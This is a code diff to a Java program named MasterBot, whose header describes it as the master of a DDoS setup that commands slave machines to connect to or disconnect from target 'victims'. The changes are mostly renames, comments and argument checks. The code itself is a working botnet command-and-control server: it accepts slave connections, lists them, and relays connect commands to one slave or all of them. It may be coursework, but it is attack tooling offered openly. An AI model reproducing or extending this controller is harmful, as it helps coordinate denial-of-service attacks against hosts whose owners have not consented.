@@ -1,4 +1,15 @@
-
+/* Master for ddos.
+ *
+ * Aruthor : Sitao Mei
+ *
+ * The ddos topolog was as below:
+ * Master -   Slave  -  Target
+ *          \        \   ...
+ *           \        \ Traget
+ *            \ Slave - -
+ *  Desc :
+ *  User from Master could control Slaves to connect or dis-connect to Targets (victims) via commands.
+ */
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -28,13 +39,20 @@ public class MasterBot {
      *         2) connect ;
      *         3) disconnect;
      */
-    public static void main(String[] args){
+    public static void main(String[] args) throws IOException {
         //Receive "-p" option for master port.
         String iparam_0 = args[0] ;
+
+        //Check parameters sanity
+        if ( args.length != 2){
+            System.out.println("Illegal Parameters sets; You should input format: MaterBot -p/P <srcPort>");
+            System.exit(1);
+        }
         if ( !iparam_0.equalsIgnoreCase("-p") ){
             System.out.println("Invalid Parameter : " + args[0] + " ; You should input format: MaterBot -p/P <srcPort>");
             System.exit(1);
         }
+        // Read parame@ Port.
         try {
             srcPort = Integer.parseInt(args[1]);
         }
@@ -42,6 +60,7 @@ public class MasterBot {
             Nfe.printStackTrace();
             System.exit(1);
         }
+
         //Call method go.
         MasterBot master = new MasterBot();
         master.go();
@@ -57,11 +76,11 @@ public class MasterBot {
         try {
             serverSock = new ServerSocket(srcPort);
             //new thread for connection monitor
-            Thread t_slave_conn = new Thread (new SlaveConnRx()  ) ;
+            Thread t_slave_conn = new Thread (new ListenSlaveConn()  ) ;
             t_slave_conn.start();
 
             //new thread for console commands read
-            Thread t_console = new Thread (new ConsolRead()  ) ;
+            Thread t_console = new Thread (new UserCli()  ) ;
             t_console.start();
 
         } catch (Exception ex) {
@@ -70,18 +89,24 @@ public class MasterBot {
         }
 
     }
-    /*  Command monitor from console
+    /*  Class for Command monitor from console
      *
+     *  New thread could be run for console commands input from user.Then Parse commands and
+     *  do execution commands.
      *
+     *  Supported commands :
+     *  1) list : list all slaves connected with mastr;
+     *  2) connect : command asking slave to connect with target host.
+     *  3) disconnect : command asking slave to dis-connect with target host.
      */
-    public class ConsolRead implements Runnable {
+    public class UserCli implements Runnable {
         BufferedReader reader ;
 
         public void run (){
             String consolCmd ;
             String [] splitCmd = null;
             try {
-                //Display symbol >
+                //Display prompt symbol >
                 System.out.print(">");
                 reader = new BufferedReader(new InputStreamReader(System.in))  ;
                 while ( (consolCmd= reader.readLine())!=null) {
@@ -106,6 +131,9 @@ public class MasterBot {
             }
         }
 
+        /* Method : <list> command from console
+         *           display all slaves in "slaveset" list connected with master to console.
+         */
         public void listHandler (String [] splitCmd) {
             if ( splitCmd.length==1) {
                 if (slaveset.size()!=0) {
@@ -116,10 +144,14 @@ public class MasterBot {
                     System.out.println("Empty!");
                 }
             } else {
-                System.out.println ("Error, illegal input command format!");
+                System.out.println ("Error, You should input <list> without paramters! ");
             }
         }
 
+        /* Method : Write user commands to connected slave.
+         * 1) dedicated slave from command parameters.
+         * 2) all : all slaves in "slaveset" list.
+         */
         public void slaveConnTx (String consolCmd,String[] splitCmd) {
             try {
                 String slaveIp = null ;
@@ -131,16 +163,15 @@ public class MasterBot {
                 } else{
                     slaveIp="all" ;
                 }
-                System.out.println ("user input addr:  "+slaveIp+ "; slaveNmae: "+ slaveName) ;
-                //int slavePort=Integer.parseInt(splitCmd[3]);
-                //Socket Sock = getSock(slaveIp,slavePort);
+
+                //System.out.println ("user input addr:  "+slaveIp+ "; slaveNmae: "+ slaveName) ;
                 Socket Sock =null ;
                 for ( Host slave : slaveset ) {
-                    System.out.println ("Query list, ipaddr:  "+slave.ipAddr+ "; srcPort: "+slave.srcPort) ;
+                    //System.out.println ("Query list, ipaddr:  "+slave.ipAddr+ "; srcPort: "+slave.srcPort) ;
                     if (slaveIp.equals("all")) {
                         Sock = slave.slaveSock;
                     }else if (slave.ipAddr.equals(slaveIp)) {
-                        System.out.println("Found:  " + slave.ipAddr + "; " + slave.srcPort);
+                        //System.out.println("Found:  " + slave.ipAddr + "; " + slave.srcPort);
                         Sock = slave.slaveSock;
                     } else {
                         Sock =null;
@@ -160,9 +191,9 @@ public class MasterBot {
         }
     } // close Class ConsolScan
 
-    /*  Slave Connection handler
+    /*  Server listening on Slave Connection requests.
      */
-    public class SlaveConnRx implements Runnable {
+    public class ListenSlaveConn implements Runnable {
         public void run (){
             //InetAddress  slaveIP ;
             String  slaveHostname ;
@@ -177,8 +208,8 @@ public class MasterBot {
                     slave.ipAddr = slaveSock.getInetAddress().getHostAddress();
                     slave.hostName = slaveSock.getInetAddress().getHostName();
                     slave.srcPort = slaveSock.getPort();
-                    slave.timeStamp = new SimpleDateFormat("yyyy-MM-dd_HHmmss").format(Calendar.getInstance().getTime());
-                    System.out.println ("Accepted connection from slave: "+slave.ipAddr+","+slave.hostName+",port:"+slave.srcPort +",time:"+slave.timeStamp);
+                    slave.timeStamp = new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime());
+                    //System.out.println ("Accepted connection from slave: "+slave.ipAddr+","+slave.hostName+",port:"+slave.srcPort +",time:"+slave.timeStamp);
                     slaveset.add(slave);
                 }
             } catch (IOException ex) {
@@ -187,11 +218,12 @@ public class MasterBot {
         }
     }
 
-    /* Sub-class :  Slaves
+    /* Sub-class :  Host
      * @slave host name
      * @slave IP
      * @Slave Source port
      * @Register data
+     * @socket for data stream.
      *
      * This sub class is for registered class.
      */
